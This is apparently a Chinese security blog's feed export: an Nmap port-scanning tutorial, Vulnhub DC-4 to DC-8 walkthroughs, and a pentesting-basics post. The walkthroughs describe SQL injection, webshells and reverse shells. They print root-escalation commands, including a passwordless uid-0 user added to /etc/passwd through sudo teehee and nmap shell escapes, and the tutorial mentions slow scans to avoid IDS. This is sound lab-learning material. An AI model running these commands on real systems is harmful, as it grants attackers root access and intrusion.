    <url>/2024/07/09/Nmap%20%E5%9F%BA%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="Nmap-基本端口扫描"><a href="#Nmap-基本端口扫描" class="headerlink" title="Nmap 基本端口扫描"></a>Nmap 基本端口扫描</h1><p>上面介绍了nmap扫描的前三个步骤，枚举目标，发现存活主机，反向DNS查找。</p><p>下面将介绍端口信息的扫描。</p><p>Nmap考虑以下六种状态：</p><ol><li><strong>Open</strong>：表示服务正在监听指定端口。</li><li><strong>Closed</strong>：表示没有服务在监听指定端口，尽管该端口可以访问。可访问是指该端口可以访问，并且未被防火墙或其他安全设备/程序阻止。</li><li><strong>Filtered</strong>：表示Nmap无法确定端口是打开还是关闭，因为端口无法访问。此状态通常是由于防火墙阻止Nmap到达该端口。Nmap的数据包可能被阻止到达端口；或者响应被阻止到达Nmap的主机。</li><li><strong>UnFiltered</strong>：表示Nmap无法确定端口是打开还是关闭，尽管该端口可以访问。使用 ACK 扫描时会遇到此状态<code>-sA</code>。</li><li><strong>Open|Filtered</strong>：这意味着Nmap无法确定该端口是开放的还是被过滤的。</li><li><strong>Closed|Filtered</strong>：这意味着Nmap无法决定端口是否关闭或被过滤。</li></ol><p>下图是RFC793 定义的tcp表头</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/79ca8e4acbd573a27cee413cde927769.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/79ca8e4acbd573a27cee413cde927769.png"></p><p>第一行是源端口号和目标主机端口号。</p><p>第二行和第三行是序列号和确认号。每行分配了32位(4字节)，总共6行，共24字节。</p><p>TCP标头标志为：</p><ol><li><strong>URG</strong>：紧急标志表示紧急指针字段很重要。紧急指针表示传入数据是紧急的，并且设置了 URG 标志的TCP段会立即处理，而无需考虑等待先前发送的TCP段。</li><li><strong>ACK</strong>：确认标志，表示确认号是有效的。它用于确认收到TCP段。</li><li><strong>PSH</strong>：推送标志，要求TCP及时将数据传递给应用程序。</li><li><strong>RST</strong>：重置标志用于重置连接。其他设备（例如防火墙）可能会发送该标志以断开TCP 连接。当数据发送到主机并且接收端没有服务可以应答时，也会使用此标志。</li><li><strong>SYN</strong>：同步标志用于启动TCP三次握手并与其他主机同步序列号。序列号应在TCP连接建立期间随机设置。</li><li><strong>FIN</strong>：发送方没有更多数据可发送。</li></ol><h2 id="tcp扫描连接"><a href="#tcp扫描连接" class="headerlink" title="tcp扫描连接"></a>tcp扫描连接</h2><p><strong>nmap -sT ip</strong> 扫描tcp端口</p><p>已关闭的TCP端口会使用 RST/ACK 响应 SYN 数据包，以表明它未打开。当我们尝试与所有已关闭的端口发起TCP三次握手时，此模式将重复出现。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8390020a13d6f22f49233833f6265de6.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8390020a13d6f22f49233833f6265de6.png"></p><p>​                                                             tcp三次握手</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/514972cd54b3f58c83f951978ea9183e.png" alt="img"></p><p>​                                                         nmap进行tcp端口的一个探测</p><p><code>-F</code> 快速扫描 从1000个端口减少到扫描100个常用的端口。</p><p><code>-r</code>还可以添加选项以按连续顺序而不是随机顺序扫描端口。当测试端口是否以一致的方式打开时（例如，当目标启动时），此选项很有用。</p><h2 id="tcp-SYN扫描"><a href="#tcp-SYN扫描" class="headerlink" title="tcp SYN扫描"></a>tcp SYN扫描</h2><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/48e631fd3deba4a2b759ca48405fcc08.png" alt="img"></p><p>​                                                     nmap利用syn对端口进行扫描</p><p><code>nmap -sS IP</code></p><p>使用SYN进行端口扫描时，不需要进行三次握手。</p><h2 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h2><p>UDP是一种无连接协议，因此它不需要任何握手即可建立连接。我们无法保证监听UDP端口的服务会响应我们的数据包。但是，如果将UDP数据包发送到已关闭的端口，则会返回 ICMP 端口不可达错误（类型 3，代码 3）。您可以使用该选项选择UDP扫描 <code>-sU</code>；此外，您还可以将其与另一个TCP扫描结合使用。</p><p>如果是开启的端口，发送UDP数据包的话，就不会返回icmp不可达，而是无返回结果。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/085088cd1b2b122312b1ee952c4aa0f7.png" alt="img"></p><p>​                                                       udp端口开启</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8b8b32517699b96777641a97dbf9d880.png" alt="img"></p><p>​                                                            udp端口关闭</p><h2 id="微调范围和性能"><a href="#微调范围和性能" class="headerlink" title="微调范围和性能"></a>微调范围和性能</h2><p>-p-：扫描所有的端口信息。</p><p>-p80-100: 将扫描80到100这中间的端口，包括80和100</p><p>如果想扫描最常见的100个端口加 -F</p><p>使用<code>--top-ports 10</code>将检查十个最常见的端口。</p><p>可以使用-T&lt;0-5&gt; 来控制扫描时间</p><ul><li>paranoid (0)</li><li>sneaky (1)</li><li>polite (2)   </li><li>normal (3)  //正常</li><li>aggressive (4)  //攻击性</li><li>insane (5)  //疯狂</li></ul><p>为了避免IDS(入侵检测)警报，您可以考虑使用<code>-T0</code>或<code>-T1</code>。例如，<code>-T0</code>一次扫描一个端口，并在发送每个探测之间等待 5 分钟，因此您可以猜测扫描一个目标需要多长时间才能完成。如果您不指定任何时间，Nmap将使用正常<code>-T3</code>。请注意，<code>-T5</code> 在速度方面是最快的；但是，由于数据包丢失的可能性增加，这会影响扫描结果的准确性。请注意，<code>-T4</code>通常在 CTF 期间和学习扫描练习目标时使用，<strong>而<code>-T1</code>通常在隐身更重要的实际交战中使用。</strong></p><p><code>--min-rate</code> <number>   <code>--max-rate</code> <number>  控制数据包的速率 <code>--max-rate=10</code> 意思就是每秒发送的数据包不得超过10</p><p><code>--min-parallelism</code> <numprobes>  <code>--max-parallelism</code> <numprobes>  指定最大最小并行的数量 <code>--min-parallelism=512</code> 表示 nmap至少保持512个并行探测，这512个并行探测与主机存活和端口扫描有关。</p><h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><p>这个房间涵盖了三种类型的扫描。</p><table><thead><tr><th>端口扫描类型</th><th>示例命令</th></tr></thead><tbody><tr><td>TCP连接扫描</td><td><code>nmap -sT 10.10.17.29</code></td></tr><tr><td>TCP SYN 扫描</td><td><code>sudo nmap -sS 10.10.17.29</code></td></tr><tr><td>UDP扫描</td><td><code>sudo nmap -sU 10.10.17.29</code></td></tr></tbody></table><table><thead><tr><th>选项</th><th>目的</th></tr></thead><tbody><tr><td><code>-p-</code></td><td>所有端口</td></tr><tr><td><code>-p1-1023</code></td><td>扫描端口 1 至 1023</td></tr><tr><td><code>-F</code></td><td>100 个最常见的端口</td></tr><tr><td><code>-r</code></td><td>按连续顺序扫描端口</td></tr><tr><td><code>-T&lt;0-5&gt;</code></td><td>-T0 最慢，T5 最快</td></tr><tr><td><code>--max-rate 50</code></td><td>速率 &lt;= 50 数据包/秒</td></tr><tr><td><code>--min-rate 15</code></td><td>速率 &gt;= 15 数据包/秒</td></tr><tr><td><code>--min-parallelism 100</code></td><td>至少 100 个并行探针</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-8</title>
    <link href="/2024/04/18/DC-8/"/>
    <url>/2024/04/18/DC-8/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描一波</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404182015635.png" alt="image-20240418201540496"></p><p>可以看到开放了22和80端口</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261913801.png" alt="image-20240426191323619"></p><p>在这个地方可以试试sql注入，手工发现是存在的。利用sqlmap进行跑。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261914612.png" alt="image-20240426191428509"></p><p>发现账户密码，这个密码我们利用john进行解密。</p><p>admin这个账号没有跑出来，但是john这个账号可以得到密码</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261923843.png" alt="image-20240426192320716"></p><p>进行登录后台</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404261931375.png" alt="image-20240426193136297"></p><p>然后经过一番寻找，找到了一个可以写php代码的地方。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262013226.png" alt="image-20240426201343155"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262014051.png" alt="image-20240426201359908"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262014879.png" alt="image-20240426201415705"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262015372.png" alt="image-20240426201525253"></p><p>这个地方随便填一下，然后去提交，即可执行代码。</p><p>进行一个反弹shell</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262018594.png" alt="image-20240426201831511"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先来试试看suid提权</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262022359.png" alt="image-20240426202237290"></p><p>有一个exim4 先来查看一下版本信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262024710.png" alt="image-20240426202452562"></p><p>4.89版本的</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262028385.png" alt="image-20240426202801103"></p><p>可以查询到</p><p>将其放在/var/www/html目录下 然后在/tmp目录下，利用wget下载下来。对这个sh文件进行777的权限。最后./xxx.sh -m netcat 运行即可</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262043229.png" alt="image-20240426204331172"></p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-7</title>
    <link href="/2024/04/10/DC-7/"/>
    <url>/2024/04/10/DC-7/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101340212.png" alt="image-20240410134043971"></p><p>开放了22和80端口</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404131911372.png" alt="image-20240413191115189"></p><p>去访问，提示的信息是进行爆破的话可能会失败，要跳出框框思考</p><p>考察的是信息收集的能力</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404131927251.png" alt="image-20240413192741204"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404131927914.png" alt="image-20240413192750874"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404131928959.png" alt="image-20240413192802811"></p><p>ssh远程登录进去</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404131928073.png" alt="image-20240413192857903"></p><p>登录成功</p><p>去mbox看一下内容</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132051841.png" alt="image-20240413205101639"></p><p>多次提到这个路径，去查看一下</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132051956.png" alt="image-20240413205158847"></p><p>可以使用drush来更改admin的密码</p><p>在网站根目录下进行修改密码</p><p>修改命令参考:<a href="https://zhuanlan.zhihu.com/p/60880048">https://zhuanlan.zhihu.com/p/60880048</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132105520.png" alt="image-20240413210555443"></p><p>进行登录</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132113230.png" alt="image-20240413211303114"></p><p>在这个地方我们去drupal官网下载php的模块，然后上传上去</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132135732.png" alt="image-20240413213503600"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132136111.png" alt="image-20240413213627025"></p><p>接着我们创建一个文章，在里面写入php代码</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132137109.png" alt="image-20240413213731040"></p><p>进行反弹shell</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>backups.sh文件有root权限</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404132221942.png" alt="image-20240413222148879"></p><p>是一个计划任务</p><p>现在是www-data用户，在这个文件里面写入一个反弹shell的</p><p>注意利用&gt;&gt;</p><p>最后再运行这个sh文件 等待反弹shell即可</p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-6</title>
    <link href="/2024/04/09/DC-6/"/>
    <url>/2024/04/09/DC-6/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描一波</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404100950784.png" alt="image-20240410095025563"></p><p>可以看到开放了22和80端口</p><p>这里的话跟dc-2情况一样，需要去修改/etc/hosts文件 修改DNS配置信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404100957338.png" alt="image-20240410095718233"></p><p>然后windows下修改是在</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-string">&quot;C:\Windows\System32\drivers<span class="hljs-char escape_">\e</span>tc\hosts&quot;</span><br></code></pre></td></tr></table></figure><p>这个目录下的hosts文件</p><p>它是一个wordpress的cms 版本是5.1.1</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101004888.png" alt="image-20240410100413825"></p><p>利用wpscan可以把用户名给爆破出来</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101022844.png" alt="image-20240410102237638"></p><p>利用cewl生成密码字典 然后再利用wpscan进行爆破</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101028263.png" alt="image-20240410102805011"></p><p>但并没有找到相应的账号密码</p><p>那就换一个字典再次试试看 这次利用的是kali自带的密码字典 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101037818.png" alt="image-20240410103752731"></p><p>但是这个跑起来太大了 后来上网看了一下 发现官网上给了线索 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101057246.png" alt="image-20240410105721206"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101059184.png" alt="image-20240410105929126"></p><p>比起之前那个几千万的少了很多</p><p>最后得到一个账户密码</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101106827.png" alt="image-20240410110646754"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>经过一番寻找 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101222402.png" alt="image-20240410122247317"></p><p>找到了地方，可以执行系统命令</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101223825.png" alt="image-20240410122322772"></p><p>进行一个反弹shell</p><p>有长度限制，抓包修改即可</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101227647.png" alt="image-20240410122726582"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>进入home目录看一下 ，有四个用户</p><p>先查看mark用户的信息 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101231758.png" alt="image-20240410123154614"></p><p>这个信息把graham的密码给暴漏了，去进行ssh远程登录</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101235901.png" alt="image-20240410123535702"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101235661.png" alt="image-20240410123558565"></p><p>可以看到提权的有关信息</p><p>查看sh文件内容</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101237592.png" alt="image-20240410123735550"></p><p>我们可以再这个sh文件中写一个反弹shell的命令 然后以jens身份运行</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101252136.png" alt="image-20240410125214029"></p><p>反弹shell成功</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101253138.png" alt="image-20240410125318070"></p><p>成功切换到jens用户</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101253476.png" alt="image-20240410125342363"></p><p>利用nmap提权</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101258838.png" alt="image-20240410125834737"></p><p>nmap是7.4版本的</p><p>老版本提权用不了，这里用新版本的nmap提取</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt; /tmp/TF<br>sudo nmap --script=/tmp/TF<br></code></pre></td></tr></table></figure><p>老版本的提权:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">nmap --interactive <br>！sh<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404101306567.png" alt="image-20240410130601438"></p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-5</title>
    <link href="/2024/04/07/DC-5/"/>
    <url>/2024/04/07/DC-5/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描端口信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071858246.png" alt="image-20240407185828079"></p><p>开启了80和111端口</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">111</span>端口是RPC（<span class="hljs-comment">Remote Procedure Call，远程过程调用）服务的默认端口。 RPC是一种分布式应用程序框架，可用于在不同的计算机之间传输数据。</span><br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先去各个界面看了一下，发现并没有什么实际的内容</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081443603.png" alt="image-20240408144311373"></p><p>想在这进行xss来着，但是不太行。</p><p>然后扫了一下后台。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081444555.png" alt="image-20240408144412443"></p><p>没找到漏洞点。但有一点就是很奇怪</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081445349.png" alt="image-20240408144520216"></p><p>每次刷新的时候这个地方会变动。</p><p>这个变动的点其实就是上面的footer.php的内容，这里是把这个文件的内容给包含了。</p><p>尝试一下文件包含漏洞。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081447346.png" alt="image-20240408144739201"></p><p>发现是存在的。</p><p>然后是nginx服务器，可以试试日志文件包含。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081513999.png" alt="image-20240408151300889"></p><p>发现是可以的。</p><p>然后先写一个木马到日志文件中，然后再去访问这个日志</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081514744.png" alt="image-20240408151419627"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081514220.png" alt="image-20240408151436022"></p><p>连接蚁剑，可以连接</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081543529.png" alt="image-20240408154305449"></p><p>把一句话木马换成反弹shell的命令，进行反弹shell。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081548003.png" alt="image-20240408154844872"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>下一步就是进行提权了</p><p>我们进行sudo -l 命令时发现没有sudo这个命令的环境</p><p>然后我们找一下具有suid的命令有哪些</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081612690.png" alt="image-20240408161239550"></p><p>这两个可以一试</p><p>exim4需要去查看一下版本信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081735559.png" alt="image-20240408173503461"></p><p>去searchsploit查一下漏洞信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081735631.png" alt="image-20240408173555467"></p><p>没找到对应的版本漏洞</p><p>那就去看一下另一个</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081739640.png" alt="image-20240408173901503"></p><p>版本刚好可以对上</p><p>只有在/tmp目录下才可以wget文件</p><p>然后我们把sh文件上传进去之后，给它一个777的权限，运行sh文件即可。</p><p>不要蚁剑上传，要不然会因为windows和linux的换行符不一样而报错 用wget上传到/tmp目录下</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404081811053.png" alt="image-20240408181128866"></p><p>但是我给这个sh文件777的权限之后，再次运行会报错</p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-4</title>
    <link href="/2024/04/07/DC-4/"/>
    <url>/2024/04/07/DC-4/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫一波 </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071224033.png" alt="image-20240407122408898"></p><p>22和80端口开启</p><p>先去访问80端口，是一个登录界面，尝试爆破，未果 (还是字典不行啊)</p><p>去扫后台也没扫到什么东西</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071242879.png" alt="image-20240407124252827"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>最后发现还得爆破，利用hydra</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071332201.png" alt="image-20240407133202073"></p><p>注意要添加 :S=logout 这个意思就是成功登录后，Hydra将尝试执行登出操作。</p><p>进去之后有三个按钮</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071345377.png" alt="image-20240407134541324"></p><p>抓个包看看</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071346647.png" alt="image-20240407134634452"></p><p>反弹个shell</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071347148.png" alt="image-20240407134757111"></p><p>现在还是普通用户的状态，下一步就是要提权了。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071349408.png" alt="image-20240407134940299"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>注意前面开启了ssh服务，所以查看一下/etc/passwd</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071441212.png" alt="image-20240407144142941"></p><p>有两个可疑用户 但是爆破不出来密码 去home目录看看情况 貌似是三个用户</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071443805.png" alt="image-20240407144333713"></p><p>只有jim目录下有东西，其他目录下都没有</p><p>然后在jim下面找到了密码字典</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071544362.png" alt="image-20240407154450265"></p><p>利用这个字典再去爆破ssh</p><p>把这个字典放在了1.txt里面</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071458231.png" alt="image-20240407145807124"></p><p>可以得到密码信息</p><p>然后ssh登录jim用户</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071513010.png" alt="image-20240407151322928"></p><p>有一封邮件</p><p>查看一下可以得到charles的密码</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071519040.png" alt="image-20240407151905829"></p><p>分别尝试在jim和charles用户下进行提权，测试过后只有charles可以</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071522605.png" alt="image-20240407152259495"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071523306.png" alt="image-20240407152317236"></p><p>利用teehee进行提权</p><p>参考链接:</p><p><a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">https://www.cnblogs.com/zlgxzswjy/p/16118468.html</a></p><p>它是一个小众的linux编译器，提权思路就是向/etc/passwd中添加一条uid为0的用户 最后再切换到uid为0的用户即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-string">&quot;fsrm::0:0:::/bin/bash&quot;</span> | sudo teehee -a <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071527854.png" alt="image-20240407152749805"></p><p>最后到www-data用户下su 一下fsrm</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404071535553.png" alt="image-20240407153543501"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先爆破密码(字典很重要) 然后抓包修改命令 反弹shell。记得多观察，在home目录下发现三个用户，找到爆破密码字典 hydra爆破登录，注意观察信息，在邮箱中找到另外一个用户的密码。ssh登录上去，分别对两个用户进行提权，发现jim不可以，然后就是teehee提权即可。</p>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pentesting Fundamentals，Principles of Security概念</title>
    <link href="/2024/04/06/Jr%20Penetration%20Tester/"/>
    <url>/2024/04/06/Jr%20Penetration%20Tester/</url>
    
    <content type="html"><![CDATA[<h2 id="Pentesting-Fundamentals"><a href="#Pentesting-Fundamentals" class="headerlink" title="Pentesting Fundamentals"></a>Pentesting Fundamentals</h2><p>主要介绍了什么是渗透测试，以及渗透测试的大概流程是怎样的。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404172103132.png" alt="image-20240417210322923"></p><p>以及介绍了一些黑盒，灰盒，白盒测试等。</p><p>黑盒测试:测试人员不会获得有关内部工作的任何信息,应用程序或服务，相当于是一个普通用户对这个服务进行渗透，通过对程序的一些交互来进行测试。需要在信息收集和枚举这方面下功夫。</p><p>灰盒测试:测试人员对内部工作的消息知道的内容并不多，相当于是白盒和黑盒的结合。</p><p>白盒测试:测试人员了解内部工作逻辑，信息更多，着手点更多。</p><h2 id="Principles-of-Security"><a href="#Principles-of-Security" class="headerlink" title="Principles of Security"></a>Principles of Security</h2><p>这里主要介绍了一些安全原则</p><p>完整性，保密性，可用性</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202404262206614.png" 